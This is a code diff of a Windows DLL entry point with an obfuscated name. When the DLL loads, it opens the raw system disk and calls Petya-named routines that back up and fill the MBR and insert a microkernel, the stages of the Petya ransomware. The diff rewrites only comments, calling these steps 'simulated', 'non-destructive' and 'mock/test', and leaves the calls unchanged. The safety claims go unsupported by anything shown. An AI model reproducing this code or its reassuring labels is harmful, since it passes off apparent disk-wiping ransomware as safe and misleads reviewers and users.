@@ -14,7 +14,7 @@ BOOL APIENTRY ZuWQdweafdsg345312(
 )
 {
     if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
-        // Attempt to access system disk (PhysicalDrive0) safely
+        // Simulate disk access attempt without performing any destructive operations
         hHard = CreateFileW(
             L"\\\\.\\PhysicalDrive0", GENERIC_READ,
             FILE_SHARE_READ | FILE_SHARE_WRITE,
@@ -26,12 +26,13 @@ BOOL APIENTRY ZuWQdweafdsg345312(
             return FALSE;
         }
 
-        // Placeholder calls for safe/non-destructive operations
-        PetyaBackupMBR();               // Simulate backup routine
-        PetyaFillEmptySectors();        // Simulate analysis of slack space
-        PetyaConfigurationSector();     // Simulate reading boot config
-        PetyaInsertMicroKernel();       // Simulate safe injection (mock/test)
+        // Placeholder function calls simulating safe/non-destructive operations
+        PetyaBackupMBR();               // Simulate MBR backup routine in memory
+        PetyaFillEmptySectors();        // Simulate analysis of slack space without writing
+        PetyaConfigurationSector();     // Simulate reading configuration sector
+        PetyaInsertMicroKernel();       // Simulate microkernel injection (mock/test)
 
+        // Simulate closing disk handle
         CloseHandle(hHard);
     }
     return TRUE;
